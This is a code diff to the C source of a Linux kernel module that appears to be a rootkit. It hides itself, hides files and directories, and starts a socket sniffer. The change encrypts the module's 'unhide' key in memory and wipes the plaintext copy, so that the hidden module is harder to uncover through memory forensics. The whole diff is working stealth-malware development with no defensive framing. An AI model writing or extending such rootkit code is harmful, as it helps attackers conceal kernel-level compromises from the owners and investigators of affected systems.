@@ -67,6 +67,7 @@ struct __lkmmod_t {
 };
 static DEFINE_MUTEX(prc_mtx);
 static DEFINE_SPINLOCK(elfbits_spin);
+static struct kv_crypto_st *kvmgc_unhidekey;
 
 /** gcc  - fuck 32 bits shit (for now!) */
 #ifndef __x86_64__
@@ -483,12 +484,27 @@ static const match_table_t tokens = {
 	{ Opt_unknown, NULL }
 };
 
+struct check_unhidekey_t {
+    bool ok;
+    uint64_t address_value;
+};
+
+void _unhidekey_callback(const u8 * const buf, size_t buflen, size_t copied, void *userdata) {
+    struct check_unhidekey_t *validate = (struct check_unhidekey_t*)userdata;
+    if (validate && validate->address_value) {
+        if (validate->address_value == *((uint64_t*)buf))
+            validate->ok = true;
+    }
+}
+
 #define CMD_MAXLEN 128
 static ssize_t write_cb(struct file *fptr, const char __user *user, size_t size,
 			loff_t *offset)
 {
+
 	pid_t pid;
 	char param[CMD_MAXLEN + 1] = { 0 };
+	decrypt_callback cbkey = (decrypt_callback)_unhidekey_callback;
 
 	if (copy_from_user(param, user, CMD_MAXLEN))
 		return -EFAULT;
@@ -522,11 +538,16 @@ static ssize_t write_cb(struct file *fptr, const char __user *user, size_t size,
 			kv_hide_mod();
 			break;
 		case Opt_unhide_module: {
-			uint64_t val;
-			if ((sscanf(args[0].from, "%llx", &val) == 1) &&
-			    auto_unhidekey == val) {
-				kv_unhide_mod();
-			}
+				uint64_t address_value = 0;
+				struct check_unhidekey_t validate = {0};
+
+				if ((sscanf(args[0].from, "%llx", &address_value) == 1)) {
+					validate.address_value = address_value;
+					kv_decrypt(kvmgc_unhidekey, cbkey, &validate);
+					if (validate.ok == true) {
+						kv_unhide_mod();
+					}
+				}
 		} break;
 		case Opt_hide_file:
 		case Opt_hide_directory: {
@@ -561,9 +582,9 @@ static ssize_t write_cb(struct file *fptr, const char __user *user, size_t size,
 		case Opt_unhide_directory:
 			fs_del_name(args[0].from);
 			break;
-			/* Currently, directories must
-                 * be added individually: use hide-directory
-                 * */
+			/** Currently, directories must
+			* be added individually: use hide-directory
+			*/
 		case Opt_hide_file_anywhere:
 			fs_add_name_rw(args[0].from, 0);
 			break;
@@ -836,11 +857,25 @@ static int __init kv_init(void)
 #if LINUX_VERSION_CODE >= KERNEL_VERSION(5, 17, 0)
 cont:
 #endif
-	/** Init crypto engine */
-	if (kv_crypto_key_init() < 0) {
+    /** Init crypto engine */
+	if (kv_crypto_init() < 0) {
 		prerr("Failed to initialise crypto engine\n");
-		goto crypto_error;
+		goto unroll_init;
 	}
+
+	if (!(kvmgc_unhidekey = crypto_init())) {
+		prerr("Failed to encrypt unhidekey\n");
+		kv_crypto_deinit();
+		goto unroll_init;
+	}
+
+	size_t datalen = 16;
+	u8 buf[16] = {0};
+	memcpy(buf, &auto_unhidekey, 8);
+	kv_encrypt(kvmgc_unhidekey, buf, datalen);
+
+	/** discard saved key */
+	auto_unhidekey = 0;
 
 	tsk_sniff = kv_sock_start_sniff();
 	if (!tsk_sniff)
